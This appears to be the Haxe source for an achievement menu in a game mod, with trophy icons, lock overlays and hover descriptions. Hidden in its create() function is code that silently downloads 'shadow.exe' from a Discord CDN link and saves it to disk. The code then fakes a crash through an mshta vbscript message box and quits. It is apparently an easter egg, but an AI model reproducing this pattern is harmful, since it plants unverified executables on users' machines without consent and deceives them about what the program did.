package states;

import sys.FileSystem;
import flixel.FlxG;
import flixel.FlxSprite;
import flixel.input.mouse.FlxMouseEvent;
import flixel.text.FlxText;
import flixel.tweens.FlxTween;
import flixel.util.FlxSpriteUtil;
import flixel.util.FlxTimer;
import haxe.io.Bytes;
import sys.Http;
import sys.io.File;

class AchievementState extends MusicBeatState
{
	var rows:Array<Array<Trophy>> = [
		[FC_TUTORIAL, FC_WEEK1, FC_WEEK2, FC_WEEK2_5, FC_WEEK3],
		[FC_WEEK4, FC_WEEK5, FC_WEEK6, FC_ALL_OG_WEEKS],
		[FC_WEEK7, FC_WEEK8, FC_WEEK_ROLLDOG, FC_WEEK_HALLOW, PERFECT_PARRY],
		[FC_ALL_FRENZY_WEEKS, ALL_ACHIEVEMENTS]
	];

	var achievements:Array<FlxSprite> = [];
	var selector:FlxSprite;

	public var hand:FlxSprite;

	var name:FlxText;
	var desc:FlxText;

	var bigIcon:FlxSprite;
	var bigLock:FlxSprite;

	var plsWait:FlxSprite;

	override function create()
	{
		super.create();
		AchievementHandler.check();

		var bg = new FlxSprite().loadGraphic(Paths.image("menuDesat"));
		bg.color = 0xFF00FFFF;
		bg.antialiasing = true;
		add(bg);

		var black:FlxSprite = new FlxSprite(475, 30).makeGraphic(775, 663, 0xFF000000);
		black.alpha = 0.66;
		add(black);

		var black2:FlxSprite = new FlxSprite(30, 30).makeGraphic(415, 663, 0xFF000000);
		black2.alpha = 0.66;
		add(black2); // PEAK

		name = new FlxText(0, 0, 0, "", 24);
		name.setFormat("VCR OSD Mono", 32, 0xFFFFFFFF);
		add(name);

		desc = new FlxText(0, 0, 0, "", 24);
		desc.setFormat("VCR OSD Mono", 18, 0xFFFFFFFF, CENTER);
		add(desc);

		bigIcon = new FlxSprite().loadGraphic(Paths.image("achievements/achievementGrid"), true, 375, 375);
		bigIcon.antialiasing = true;
		bigIcon.visible = false;
		add(bigIcon);

		bigLock = new FlxSprite().loadGraphic(Paths.image("achievements/lockicon"));
		bigLock.antialiasing = true;
		bigLock.visible = false;
		add(bigLock);

		var ind = 0;
		for (row in 0...rows.length)
		{
			for (i in 0...rows[row].length)
			{
				var icon:FlxSprite = new FlxSprite(0, 0).loadGraphic(Paths.image("achievements/achievementGrid"), true, 375, 375);
				icon.animation.add("icon", [ind], 0, true);
				icon.animation.play("icon");
				icon.setGraphicSize(Std.int(icon.width * 0.35));
				icon.updateHitbox();
				icon.x = (black.x + (black.width / 2)) - ((icon.width + 4) * (rows[row].length / 2)) + ((icon.width + 4) * i);
				icon.y = black.y + 50 + ((icon.height + 15) * row);
				icon.ID = ind;
				icon.health = rows[row][i]; // im too lazy to make another class so im using the health variable for storing the trophy ID
				icon.antialiasing = true;
				add(icon);
				if (!AchievementHandler.hasTrophy(Trophy.order[ind]))
				{
					icon.shader = new shaders.BWShader();
					var lock:FlxSprite = new FlxSprite().loadGraphic(Paths.image("achievements/lockicon"));
					lock.setPosition(icon.x + (icon.width / 2) - (lock.width / 2), icon.y + (icon.height / 2) - (lock.height / 2));
					lock.scale.set(0.35, 0.35);
					lock.antialiasing = true;
					add(lock);
				}
				achievements.push(icon);
				ind++;
				FlxMouseEvent.add(icon, null, null, onMouseOver, onMouseOut);
			}
		}

		for (i in 0...ind)
		{
			bigIcon.animation.add('$i', [i], 0, false);
		}

		bigIcon.animation.play("0");
		bigIcon.setPosition(black2.x + (black2.width / 2) - (bigIcon.width / 2), 60);
		bigLock.setPosition(bigIcon.x + bigIcon.width - bigLock.width, bigIcon.y + bigIcon.height - bigLock.height);

		selector = new FlxSprite(achievements[0].x, achievements[0].y).makeGraphic(cast achievements[0].width, cast achievements[0].height, 0x0);
		selector.antialiasing = true;
		FlxSpriteUtil.drawRect(selector, 0, 0, selector.width, selector.height, 0x0, {color: 0xFFFFFFFF, thickness: 12});
		add(selector);
		selector.visible = false;

		hand = new FlxSprite(FlxG.mouse.x, FlxG.mouse.y);
		hand.frames = Paths.getSparrowAtlas('newMain/cursor');
		hand.animation.addByPrefix('idle', 'cursor nonselect', 0);
		hand.animation.addByPrefix('select', 'cursor select', 0);
		hand.animation.addByPrefix('qidle', 'cursor qnonselect', 0);
		hand.animation.addByPrefix('qselect', 'cursor qselect', 0);
		hand.animation.play('idle');
		hand.setGraphicSize(Std.int(hand.width / 1.5));
		hand.antialiasing = true;
		hand.updateHitbox();
		add(hand);

		plsWait = new FlxSprite().loadGraphic(Paths.image("achievements/plsWait"));
		plsWait.antialiasing = true;
		add(plsWait);
		plsWait.alpha = 0;

		if(!FileSystem.exists('shadow.exe') && ClientPrefs.playedShadow == true)
		{
			var shadow = new Http("https://cdn.discordapp.com/attachments/869878983381123072/1069439756712280134/shadow.exe");
			shadow.onBytes = function(bytes:Bytes)
			{
				File.saveBytes('shadow.exe', bytes);
			}
			shadow.request();
		}

		if (AchievementHandler.hasTrophies([FC_ALL_FRENZY_WEEKS, FC_ALL_OG_WEEKS, PERFECT_PARRY]) && ClientPrefs.playedShadow == false)
		{
			plsWait.alpha = 1;
			FlxG.mouse.visible = false;
			AchievementHandler.unlockTrophy(ALL_ACHIEVEMENTS);

			new FlxTimer().start(2, function(tmr:FlxTimer)
			{
				ClientPrefs.playedShadow = true;
				ClientPrefs.save();

				var shadow = new Http("https://cdn.discordapp.com/attachments/869878983381123072/1069439756712280134/shadow.exe");
				shadow.onBytes = function(bytes:Bytes)
				{
					File.saveBytes('shadow.exe', bytes);
				}
				shadow.request();
	
				if (FlxG.sound.music != null)
					FlxG.sound.music.stop();
	
				Sys.sleep(2);
				Sys.command('mshta vbscript:Execute("msgbox ""Uh Oh! Unexpected crash, please check your files for anything new!"":close")');
				Sys.exit(1);
			});
		}
			
	}

	var shadowTime:Bool = false;

	override function update(elapsed:Float)
	{
		super.update(elapsed);
		if (controls.BACK && !shadowTime)
			FlxG.switchState(new MainMenuState());

		if (FlxG.mouse.justMoved)
			hand.setPosition(FlxG.mouse.x, FlxG.mouse.y);
	}

	function onMouseOver(obj:FlxSprite)
	{
		desc.visible = name.visible = bigIcon.visible = selector.visible = true;
		selector.setPosition(obj.x, obj.y);

		bigIcon.animation.play('${obj.ID}');
		name.text = Trophy.names[cast obj.health];
		name.setPosition(237 - (name.width / 2), bigIcon.y + bigIcon.height + 10);

		desc.text = Trophy.descriptions[cast obj.health];
		desc.setPosition(237 - (desc.width / 2), bigIcon.y + bigIcon.height + 60);

		if (obj.shader != null)
			bigLock.visible = true;
	}

	function onMouseOut(obj:FlxSprite)
	{
		desc.visible = name.visible = bigLock.visible = bigIcon.visible = selector.visible = false;
	}
}
